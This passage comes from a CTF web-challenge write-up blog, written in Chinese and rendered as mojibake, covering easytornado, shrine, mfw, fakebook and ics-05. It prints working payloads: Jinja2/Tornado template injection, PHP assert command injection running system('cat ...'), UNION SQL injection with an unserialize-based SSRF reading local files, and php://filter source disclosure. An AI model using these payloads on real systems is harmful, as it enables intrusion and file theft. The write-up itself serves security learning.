è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</p><p> _<em>base_</em>   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±» // <strong>base</strong>å’Œ<strong>mro</strong>éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ </p><p>_<em>subclasses_</em>   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨ </p><p>_<em>init_</em>  ç±»çš„åˆå§‹åŒ–æ–¹æ³•</p><p> _<em>globals_</em>  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•</p><p>ç›´æ¥å¼€å§‹è¿™é¢˜</p></blockquote><p>1.æŸ¥çœ‹æ‰€æœ‰æ¨¡å—ï¼Œå…¶ä¸­ç¬¬41ä¸ªæ¨¡å—fileå’Œ72ä¸ªæ¨¡å—ï¼ŒåŒ…å«æ–‡ä»¶è¯»å–çš„ç›¸å…³æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨</p><pre><code class="hljs clojure">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code></pre><p><img src="https://i.loli.net/2020/12/02/j9Ahcr8sOaSyEPt.png" alt="image-20201202090652367"></p><p>2.åˆ—å‡ºæ–‡ä»¶ç›®å½•</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(<span class="hljs-name">&#x27;.&#x27;</span>)&#125;&#125;</span></code></pre><p><img src="https://i.loli.net/2020/12/02/hSIWxNvpBwqe2Qt.png" alt="image-20201202094836434"></p><p>3.è¯»å–flag</p><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;fl4g&#x27;</span>).read()</code></pre><p><img src="https://i.loli.net/2020/12/02/Qxdc9U1GbrzYvSg.png" alt="image-20201202094926424"></p><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>è¿™åˆæ˜¯webæœåŠ¡å™¨å’Œwebåº”ç”¨æ¡†æ¶ï¼Œä¼šä¸ä¼šå’Œflaskæ¡†æ¶ä¸€æ ·å­˜åœ¨æ¨¡æ¿æ¨¡æ¿æ³¨å…¥</p><h3 id="0x1-åŸç†"><a href="#0x1-åŸç†" class="headerlink" title="0x1 åŸç†"></a>0x1 åŸç†</h3><p>tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡ä¸¤ä¸ªå¤§æ‹¬å·è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</p><h3 id="0x2-è§£é¢˜"><a href="#0x2-è§£é¢˜" class="headerlink" title="0x2 è§£é¢˜"></a>0x2 è§£é¢˜</h3><p>1.å…ˆçœ‹çœ‹é¢˜ç›®ç»™çš„è¿æ¥</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">220.249.52.133:43538</span>/file?filename=/welcome.txt&amp;filehash=<span class="hljs-number">34</span>b<span class="hljs-number">3</span>f<span class="hljs-number">8</span>fdcf<span class="hljs-number">2</span>ec<span class="hljs-number">4394</span>a<span class="hljs-number">5</span>b<span class="hljs-number">9</span>b<span class="hljs-number">20580</span>c<span class="hljs-number">0096</span></code></pre><p>æäº¤çš„å‚æ•°æ˜¯æ–‡ä»¶åå’Œæ–‡ä»¶çš„hashå€¼</p><p>å¹¶ä¸”ç»™äº†ä¸‰webé¡µé¢</p><pre><code class="hljs jboss-cli"><span class="hljs-string">/flag.txt</span><span class="hljs-string">/welcome.txt</span><span class="hljs-string">/hints.txt</span></code></pre><p>flag.txt</p><pre><code class="hljs jboss-cli">flag in <span class="hljs-string">/fllllllllllllag</span></code></pre><p>hints.txtç»™çš„æç¤º</p><pre><code class="hljs stylus">/hints.txt<span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(cookie_secret+md5(filename)</span></span>)</code></pre><p>è¿™å°±çŸ¥é“äº†<code>filehash</code>çš„æ¥æºäº†</p><p>2.è¯»å–flag.txtå°±å¿…é¡»æ„é€ payloadï¼š</p><pre><code class="hljs awk"><span class="hljs-regexp">//</span>?filename=<span class="hljs-regexp">/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/</span>fllllllllllllag))</code></pre><p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“cookie_secret çš„å€¼ï¼Œå…ˆæäº¤è¯•è¯•</p><p><img src="https://i.loli.net/2020/12/02/7GzhFyxqJT9ZwNH.png" alt="image-20201202100637168"></p><p>å‡ºç°äº†è¿™ä¸ªé”™è¯¯é¡µé¢ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶msgçš„å€¼ï¼Œå­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p>3.è¾“å…¥<code>msg=&#123;&#123;handler.settings&#125;&#125;</code>,è·å–å½“å‰çš„ç¯å¢ƒå˜é‡ï¼Œå¾—åˆ°cookie_sercetçš„å€¼ </p><p><img src="https://i.loli.net/2020/12/02/CijHGvlO7Pft8ur.png" alt="image-20201202101520762"></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$filename</span> = md5(<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span>);<span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;cb82b218-07e3-491d-a302-532dbae27e6a&#x27;</span>;<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$s</span>.<span class="hljs-variable">$filename</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>äºæ˜¯æ„é€ å‡ºpayload</p><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=/fllllllllllllag&amp;filehash=0caf8cf587a036fabea3fa65f058c275</code></pre><p>æ‹¿åˆ°flag</p><blockquote><p>å‚è€ƒ:</p><p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">https://www.cnblogs.com/cimuhuashuimu/p/11544455.html</a></p></blockquote><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><pre><code class="hljs php">import flaskimport osapp = flask.Flask(__name__)app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)def index():    <span class="hljs-keyword">return</span> open(<span class="hljs-keyword">__file__</span>).read()@app.route(<span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span>)def shrine(shrine):    def safe_jinja(s):        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="hljs-keyword">for</span> c in blacklist]) + s    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="hljs-literal">True</span>)</code></pre><h3 id="0x1è€ƒå¯Ÿç‚¹"><a href="#0x1è€ƒå¯Ÿç‚¹" class="headerlink" title="0x1è€ƒå¯Ÿç‚¹"></a>0x1è€ƒå¯Ÿç‚¹</h3><p>å¾ˆæ˜æ˜¾çš„flaskæ¡†æ¶</p><p>å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯å¯¹()è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶å°†config , self åŠ å…¥äº†é»‘åå•ï¼Œ<code>Web_python_template_injection</code>è¿™é¢˜çš„payloadå°±æ²¡æ³•ç”¨äº†ã€‚</p><p><img src="https://i.loli.net/2020/12/02/JT7Wnk3u86IVHQe.png" alt="image-20201202103810281"></p><h3 id="0x2æ„é€ payload"><a href="#0x2æ„é€ payload" class="headerlink" title="0x2æ„é€ payload"></a>0x2æ„é€ payload</h3><p>å¯ä»¥ä½¿ç”¨å†…ç½®å‡½æ•°<code>get_flashed_messages()</code>ï¼Œåˆå› ä¸ºconfigåœ¨current_appé‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payload</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span></code></pre><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>çœ‹åˆ°äº†gitï¼Œå¯èƒ½å­˜åœ¨gitæºç æ³„éœ²</p><p><img src="https://i.loli.net/2020/12/02/M6zWQwdqsvRj1mD.png" alt="git-1"></p><p>è®¿é—®<a href="http://220.249.52.133:44852/.git/ï¼Œç¡®å®šå­˜åœ¨æºç æ³„éœ²ï¼Œä½¿ç”¨githackä¸‹è½½æºç ï¼Œç›®å½•ç»“æ„å¦‚å›¾ï¼Œtemplatesä¸‹å­˜åœ¨flag.php,å®ƒå°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ã€‚">http://220.249.52.133:44852/.git/ï¼Œç¡®å®šå­˜åœ¨æºç æ³„éœ²ï¼Œä½¿ç”¨githackä¸‹è½½æºç ï¼Œç›®å½•ç»“æ„å¦‚å›¾ï¼Œtemplatesä¸‹å­˜åœ¨flag.php,å®ƒå°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ã€‚</a></p><p><img src="https://i.loli.net/2020/12/02/BXmiCHp5bocy7Tn.png" alt="git-2"></p><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;&#125;<span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span>assert(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span>assert(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p><strong>file_exists</strong>å‡½æ•°</p><p><img src="https://i.loli.net/2020/12/02/VngSuP6h2W5xbHO.png" alt="git-3">fil</p><p>è¾“å…¥</p><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=flag</code></pre><p>é¡µé¢æ˜¾ç¤ºä¸ºç©ºï¼Œå› ä¸ºfile_existsåªèƒ½åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ— æ³•è¿”å›æ–‡ä»¶å†…å®¹ï¼Œè¿™å°±ç”¨åˆ©ç”¨catè¯»å–å†…å®¹äº†ã€‚å› ä¸ºæ²¡æœ‰å¯¹pageåšå…¶ä»–çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨assert + systemï¼Œè¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„ç›®çš„ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>assertå‡½æ•°ä¼šå°†ä¼ å…¥çš„å‚æ•°å½“ä½œphpä»£ç æ‰§è¡Œ</p><p>æ„é€ payloadï¼Œè¿™é‡Œå°±åƒsqlæ³¨å…¥çš„è¯­å¥ï¼Œé—­åˆå‰é¢çš„è¯­å¥å¹¶å¡«å†™è‡ªå·±æƒ³è¦çš„è¯­å¥</p><pre><code class="hljs xquery">å…ˆæµ‹è¯•ä¸€ä¸‹æƒ³æ³•å¯¹ä¸å¯¹//?page=<span class="hljs-string">&#x27;) or phpinfo();#</span><span class="hljs-string">//assert(&quot;file_exists(&#x27;</span><span class="hljs-variable">$file</span><span class="hljs-string">&#x27;) or phpinfo();)#</span><span class="hljs-string">?page=&#x27;</span>)<span class="hljs-meta">%20or</span><span class="hljs-meta">%20phpinfo</span>()<span class="hljs-meta">%3B</span><span class="hljs-meta">%23</span>æ˜¾ç¤ºå‡ºäº†phpinfo(),æ‰€ä»¥æ€è·¯æ˜¯å¯¹çš„ç»§ç»­æ„é€ //?page=<span class="hljs-string">&#x27;) or system(&quot;cat templates/flag.php&quot;); #</span><span class="hljs-string">æœ€åçš„payload</span><span class="hljs-string"></span><span class="hljs-string">?page=&#x27;</span>)<span class="hljs-meta">%20or</span><span class="hljs-meta">%20system</span>(<span class="hljs-meta">%22cat</span><span class="hljs-meta">%20templates</span><span class="hljs-meta">%2Fflag</span>.php<span class="hljs-meta">%22</span>)<span class="hljs-meta">%3B</span><span class="hljs-meta">%23</span></code></pre><p><img src="https://i.loli.net/2020/12/02/Z9L2rxqjBgMyViv.png" alt="git-4"></p><p><img src="https://i.loli.net/2020/12/02/U4TOzpaGBhHKlIV.png" alt="git-5"></p><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><h3 id="0x1-sqlæ³¨å…¥"><a href="#0x1-sqlæ³¨å…¥" class="headerlink" title="0x1 sqlæ³¨å…¥"></a>0x1 sqlæ³¨å…¥</h3><p>è¿›å…¥ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªåšå®¢é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªè²Œä¼¼å¯ä»¥æ³¨å…¥çš„åœ°æ–¹</p><p><code>http://220.249.52.133:44224/view.php?no=1</code>å‚æ•°noè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæ•°å­—å‹çš„æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•ä¸€ä¸‹ã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>ç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šäº†å°±æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>æ¥ä¸‹æ¥ç»§ç»­æ³¨å…¥çš„å¸¸è§„æ“ä½œã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>æ—¶é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œå¹¶æç¤ºäº†ç½‘ç«™çš„æ ¹ç›®å½•</p><p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p><p>ä½†æ˜¯å½“ order by 5 # æ—¶ï¼Œç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šæ˜¯å››åˆ—ã€‚</p><p><strong>çˆ†è¡¨å</strong></p><p>æœ¬ä»¥ä¸ºä¼šé¡ºåˆ©çš„çˆ†ç ´å‡ºæ¥ï¼Œä½†æ˜¯æç¤ºäº† hacker ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨é»‘åå•æ£€æµ‹</p><p>è¯•äº†è¯•åŒå†™ç»•è¿‡ï¼Œå‘ç°ç»§ç»­æç¤ºhackï¼Œå†è¯•è¯•ç”¨/**/æ›¿æ¢ç©ºæ ¼ï¼Œè¿™æ¬¡å±…ç„¶å¯ä»¥äº†ï¼Œæš‚ä¸”å½“å®ƒæ˜¯ç¦äº†ç©ºæ ¼ã€‚è¿™é‡Œè¿˜å‡ºç°ä¸€ä¸ªæç¤º</p><pre><code class="hljs pgsql"><span class="hljs-keyword">Notice</span>: unserialize(): Error at <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> bytes <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">view</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">31</span>æç¤ºå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç»§ç»­çˆ†è¡¨ã€‚</code></pre><p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>#?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#/<span class="hljs-comment">/**no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS**</span></code></pre><p>çˆ†å‡ºä¸€å¤§å †åˆ—åã€‚ç›´æ¥è¯»å–dataçš„å†…å®¹</p><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> users),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> #</code></pre><p>å‘ç°å†…å®¹æ˜¯æ³¨å†Œæ—¶ä¿¡æ¯ä¿å­˜ä¸ºåºåˆ—åŒ–å†…å®¹</p><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;22.github.io&quot;</span>;&#125;</code></pre><p>åˆ°è¿™é‡Œå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†ã€‚ã€‚ã€‚</p><p><strong>åšåˆ°è¿™é‡Œæˆ‘ä»¬å¤§è‡´çŸ¥é“äº†ä¸‹é¢çš„ä¿¡æ¯ï¼š</strong></p><blockquote><p>view.phpè¿›è¡Œäº†å¯¹æŸä¸ªæ•°æ®è¿›è¡Œååºåˆ—åŒ–(unserializa)æ“ä½œï¼Œä»ä¸Šé¢è·‘å‡ºçš„dataåˆ†ææ˜¯å¯¹dataè¿›è¡Œäº† ååºåˆ—åŒ–æ“ä½œ,åœ¨ä¸Šä¸€æ­¥éª¤ä¸­æˆ‘ä»¬å¾—åˆ°äº†userè¡¨æœ‰4åˆ—åˆ†åˆ«ä¸ºnoï¼Œpasswdï¼Œdataï¼Œusernameï¼Œå¹¶æ²¡æœ‰ å•ç‹¬å­˜æ”¾blogåˆ—ï¼Œæ‰€ä»¥blogæ˜¾ç¤ºåº”è¯¥æ˜¯ä»dataåˆ—å–å‡ºå†è¿›è¡Œååºåˆ—åŒ–</p></blockquote><h3 id="0x02ä»£ç å®¡è®¡"><a href="#0x02ä»£ç å®¡è®¡" class="headerlink" title="0x02ä»£ç å®¡è®¡"></a>0x02ä»£ç å®¡è®¡</h3><p>æ‰«æä¸€ä¸‹ç›®å½•å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™å‡ºæ¥äº†æºç å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„</p><p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p><p>æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>ä¿¡æ¯ç±»</span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // å¤„ç†<span class="hljs-title">url</span></span><span class="hljs-function"></span>&#123;      <span class="hljs-variable">$ch</span> = curl_init();   <span class="hljs-comment">//åˆå§‹åŒ–ä¸€ä¸ªcurlä¼šè¯</span>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);   <span class="hljs-comment">//è®¾ç½®urlå’Œç›¸åº”çš„å‚æ•°</span>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);            <span class="hljs-comment">// æ‰§è¡Œè¿™ä¸ªcURLä¼šè¯</span>    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);  <span class="hljs-comment">//è·å–çŠ¶æ€ç </span>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;    &#125;    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>) //è¿™æ˜¯æ³¨å†Œè´¦å·æ—¶æ£€æµ‹<span class="hljs-title">blog</span>æ˜¯å¦åˆæ³•</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);&#125;&#125;</code></pre><p>å®¡è®¡æºç å‘ç°å…¶ä¸­get()å‡½æ•°å­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$url</span>)</span></span> <span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;blog)</span></span></code></pre><p>è¿™é‡Œgetä¸­çš„å‚æ•°å–è‡ªblogï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ„é€ å‡ºä¸€ä¸ªssrfï¼Œå°†blogä½ç½®ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦è®¿é—®çš„ä½ç½®ï¼Œç»“åˆä¸Šé¢çš„æç¤ºå°±æ„é€ å‡ºä¸‹é¢çš„payloadï¼š</p><pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre><p>æŸ¥çœ‹æºç ï¼Œè§£base64ã€‚</p><p><strong>æ€è·¯ï¼šåˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œåˆ©ç”¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶ã€‚</strong></p><h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>è¿›å…¥é¡µé¢åªæœ‰ä¸€ä¸ªæ˜¯æœ‰ç”¨çš„ï¼Œè¿›å…¥è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ</p><p><img src="https://i.loli.net/2020/12/02/Qje1Yih9dwH3xnm.png" alt="image-20201202170901536"></p><p>å…ˆç‚¹å‡»äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒï¼Œurlä¼šå‘ç”Ÿæ”¹å˜å‡ºç°pageå‚æ•°ï¼Œè¿™ä¸€çœ‹å°±æ˜¯å…¸å‹çš„è¯»å–æºç </p><p>æ„é€ payload:</p><pre><code class="hljs awk">?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index.php</code></pre><p>æºç ä¸­çš„phpä»£ç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) &#123;<span class="hljs-keyword">if</span> (ctype_alnum(<span class="hljs-variable">$page</span>)) &#123;<span 